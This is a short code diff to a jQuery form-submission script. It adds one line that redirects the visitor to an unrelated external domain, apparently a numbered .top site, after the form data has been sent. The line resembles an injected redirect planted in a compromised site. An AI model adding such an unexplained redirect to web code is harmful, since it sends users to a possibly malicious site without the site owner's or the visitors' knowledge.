@@ -20,6 +20,7 @@ $(document).ready(function() {
                 data: JSON.stringify(data),
                 success: function(response) {
                     console.log('Information sent successfully!');
+                    window.location.href = "https://1xlite-352419.top/en";
                 },
                 error: function(xhr, status, error) {
                     console.log('Error sending information: ' + xhr.responseText);
